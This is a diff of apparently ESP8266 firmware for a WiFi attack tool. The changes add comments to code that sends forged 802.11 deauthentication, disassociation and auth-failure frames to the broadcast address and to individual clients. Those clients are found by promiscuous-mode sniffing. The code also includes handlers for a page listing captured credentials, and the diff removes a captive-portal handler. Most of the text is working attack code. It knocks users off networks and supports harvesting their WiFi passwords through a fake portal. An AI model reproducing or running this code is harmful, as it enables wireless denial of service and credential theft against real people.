-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
-        0x00, 0x00,                         
-        0x03, 0x00,                       
-        0x01, 0x00,                        
-        0x0F, 0x00                          
-    }; 
+        0xB0, 0x00,                         // Frame Control (2 bytes)
+        0x00, 0x00,                         // Duration (2 bytes)
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination address (6 bytes)
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Source address (6 bytes)
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID (6 bytes)
+        0x00, 0x00,                         // Sequence number (2 bytes)
+        0x03, 0x00,                         // Authentication algorithm (2 bytes)
+        0x01, 0x00,                         // Authentication SEQ (2 bytes)
+        0x0F, 0x00                          // Status code (2 bytes)
+    }; // Total: 30 bytes
 
-
+    // Scan for clients every 10 seconds if enabled
     if (scan_for_clients && millis() - last_client_scan > 10000)
     {
       scanForClients();
       last_client_scan = millis();
     }
 
-    
+    // Send deauth to broadcast address (all clients)
     memcpy(&deauthPacket[4], broadcast, 6);
     memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
     memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
     wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
 
-
+    // Send disassoc to broadcast address
     memcpy(&disassocPacket[4], broadcast, 6);
     memcpy(&disassocPacket[10], _selectedNetwork.bssid, 6);
     memcpy(&disassocPacket[16], _selectedNetwork.bssid, 6);
     wifi_send_pkt_freedom(disassocPacket, sizeof(disassocPacket), 0);
 
-
+    // Target specific clients if we have any
     for (int i = 0; i < client_count && i < MAX_CLIENTS; i++)
     {
-
+      // Send deauth from AP to client
       memcpy(&deauthPacket[4], client_addresses[i], 6);
       memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
       memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
       wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
 
- 
+      // Send deauth from client to AP
       memcpy(&deauthPacket[4], _selectedNetwork.bssid, 6);
       memcpy(&deauthPacket[10], client_addresses[i], 6);
       memcpy(&deauthPacket[16], client_addresses[i], 6);
       wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
 
-  
+      // Send disassoc from AP to client
       memcpy(&disassocPacket[4], client_addresses[i], 6);
       memcpy(&disassocPacket[10], _selectedNetwork.bssid, 6);
       memcpy(&disassocPacket[16], _selectedNetwork.bssid, 6);
       wifi_send_pkt_freedom(disassocPacket, sizeof(disassocPacket), 0);
 
-
+      // Send auth failure to client
       memcpy(&authPacket[4], client_addresses[i], 6);
       memcpy(&authPacket[10], _selectedNetwork.bssid, 6);
       memcpy(&authPacket[16], _selectedNetwork.bssid, 6);
       wifi_send_pkt_freedom(authPacket, sizeof(authPacket), 0);
 
-
+      // Small delay between packets to avoid buffer overflow
       delay(1);
     }
 
@@ -1270,14 +1107,14 @@ void loop() {
   }
 }
 
-
+// Improved client scanning function
 void scanForClients() {
   if (_selectedNetwork.ssid == "") return;
 
   Serial.println("Scanning for clients on " + _selectedNetwork.ssid);
   Serial.println("Channel: " + String(_selectedNetwork.ch));
 
-
+  // Keep track of previous clients
   uint8_t previous_clients[MAX_CLIENTS][6];
   int previous_count = client_count;
   
@@ -1287,29 +1124,30 @@ void scanForClients() {
 
   client_count = 0;
 
-
+  // Set channel and enable promiscuous mode
   wifi_set_channel(_selectedNetwork.ch);
   wifi_promiscuous_enable(0);
   wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {
-    if (len < 24) return;
+    if (len < 24) return; // Minimum size for a data frame
     
-  
+    // Get frame control field
     uint8_t frame_type = buf[12] & 0x0C;
     uint8_t frame_subtype = buf[12] & 0xF0;
-
-    if (frame_subtype == 0x80) return; 
     
-    uint8_t *addr1 = &buf[16]; 
-    uint8_t *addr2 = &buf[10]; 
-    uint8_t *addr3 = &buf[4];  
+    // Process all frame types except beacons
+    if (frame_subtype == 0x80) return; // Skip beacon frames
     
-
+    uint8_t *addr1 = &buf[16]; // First address
+    uint8_t *addr2 = &buf[10]; // Second address
+    uint8_t *addr3 = &buf[4];  // Third address
+    
+    // Debug output
     Serial.print("Frame type: 0x");
     Serial.print(frame_type, HEX);
     Serial.print(" subtype: 0x");
     Serial.println(frame_subtype, HEX);
     
- 
+    // Check addresses against AP BSSID
     bool is_ap_related = false;
     if (memcmp(addr1, _selectedNetwork.bssid, 6) == 0 ||
         memcmp(addr2, _selectedNetwork.bssid, 6) == 0 ||
@@ -1319,7 +1157,7 @@ void scanForClients() {
     
     if (!is_ap_related) return;
     
- 
+    // Find client address (the one that's not the AP)
     uint8_t *client_addr = NULL;
     if (memcmp(addr1, _selectedNetwork.bssid, 6) != 0 && !isMulticast(addr1)) {
       client_addr = addr1;
@@ -1331,12 +1169,12 @@ void scanForClients() {
     
     if (client_addr == NULL) return;
     
-
+    // Check if we already have this client
     for (int i = 0; i < client_count; i++) {
       if (memcmp(client_addresses[i], client_addr, 6) == 0) return;
     }
     
-
+    // Add new client
     if (client_count < MAX_CLIENTS) {
       memcpy(client_addresses[client_count], client_addr, 6);
       client_count++;
@@ -1345,14 +1183,15 @@ void scanForClients() {
     }
   });
 
-
+  // Enable promiscuous mode and scan
   wifi_promiscuous_enable(1);
-  delay(5000);
+  delay(5000); // Scan for 5 seconds
   wifi_promiscuous_enable(0);
   
-
+  // Reset callback
   wifi_set_promiscuous_rx_cb(NULL);
   
+  // Restore previous clients if none found
   if (client_count == 0 && previous_count > 0) {
     for (int i = 0; i < previous_count; i++) {
       memcpy(client_addresses[i], previous_clients[i], 6);
@@ -1365,14 +1204,14 @@ void scanForClients() {
   Serial.println(client_count);
 }
 
-
+// Helper function to check for multicast/broadcast addresses
 bool isMulticast(uint8_t *addr) {
-  return (addr[0] & 0x01) || 
+  return (addr[0] & 0x01) || // Multicast/broadcast bit
          (addr[0] == 0xFF && addr[1] == 0xFF && addr[2] == 0xFF && 
-          addr[3] == 0xFF && addr[4] == 0xFF && addr[5] == 0xFF); 
+          addr[3] == 0xFF && addr[4] == 0xFF && addr[5] == 0xFF); // Broadcast
 }
 
-
+// Function to handle stored credentials page
 void handleStoredCredentials()
 {
   String html = "<!DOCTYPE html><html><head>"
@@ -1422,7 +1261,7 @@ void handleStoredCredentials()
 
     html += "</table></div>";
 
- 
+    // Add delete all button
     html += "<form method='get' action='/deleteall' style='margin-top:10px;'>";
     html += "<button class='delete-all-btn'>Delete All Credentials</button></form>";
   }
@@ -1437,7 +1276,7 @@ void handleStoredCredentials()
   webServer.send(200, "text/html", html);
 }
 
-
+// Function to handle credential deletion
 void handleDeleteCredential()
 {
   if (webServer.hasArg("id"))
@@ -1445,7 +1284,7 @@ void handleDeleteCredential()
     int id = webServer.arg("id").toInt();
     if (id >= 0 && id < credentialsCount)
     {
-     
+      // Delete the credential
       deleteCredential(id);
 
       webServer.send(200, "text/html", "<!DOCTYPE html><html><head>"
@@ -1477,7 +1316,7 @@ void handleDeleteCredential()
   }
 }
 
-
+// Function to handle deleting all credentials
 void handleDeleteAllCredentials()
 {
   deleteAllCredentials();
@@ -1499,23 +1338,4 @@ void handleDeleteAllCredentials()
                                    "<h2>All Credentials Deleted</h2>"
                                    "<p>All stored credentials have been successfully deleted.</p>"
                                    "</div></body></html>");
-}
-
-
-void handleCaptivePortal() {
-  if (isCaptivePortalRequest()) {
-    if (hotspot_active) {
-
-      webServer.sendHeader("Cache-Control", CACHE_CONTROL_NO_CACHE);
-      webServer.send(204);
-    } else {
-    
-      webServer.sendHeader("Location", "http://" + webServer.client().localIP().toString(), true);
-      webServer.send(302, CONTENT_TYPE_PLAIN, "");
-    }
-    return;
-  }
-  
- 
-  handleIndex();
 }
